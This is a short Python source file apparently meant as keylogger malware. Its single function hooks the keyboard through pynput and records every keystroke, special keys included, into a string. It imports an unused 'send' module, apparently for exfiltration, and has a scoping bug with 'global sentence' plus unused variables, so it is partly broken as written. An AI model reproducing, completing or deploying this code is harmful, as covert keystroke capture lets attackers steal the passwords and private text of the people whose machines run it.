def log_keys(interval_in_mins):
    import pynput.keyboard
    import send
    from pynput.keyboard import Key

    sentence = ""

    def key_press(key):
        global sentence
        if key == Key.enter:
            sentence += '\n'
        elif key == Key.caps_lock:
            sentence += "[CAPS_LOCK]"
        elif key == Key.shift or key == Key.shift_r or key == Key.shift_l:
            sentence += "[SHIFT]"
        elif key == Key.tab:
            sentence += "    "
        elif key == Key.ctrl:
            sentence += "[CTRL]"
        elif key == Key.space:
            sentence += " "
        elif key == Key.alt:
            sentence += "[ALT]"
        elif key == Key.cmd:
            sentence += "[COMMAND]"
        elif key == Key.left:
            sentence += "[LEFT]"
        elif key == Key.right:
            sentence += "[RIGHT]"
        elif key == Key.up:
            sentence += "[UP]"
        elif key == Key.down:
            sentence += "[DOWN]"
        elif key == Key.backspace:
            sentence += "[BACKSPACE]"
        else:
            sentence += str(key.char)

    keyboard_listener = pynput.keyboard.Listener(on_press=key_press)

    counter = 0

    with keyboard_listener:
        try:
            keyboard_listener.join()
        except:
            print(sentence)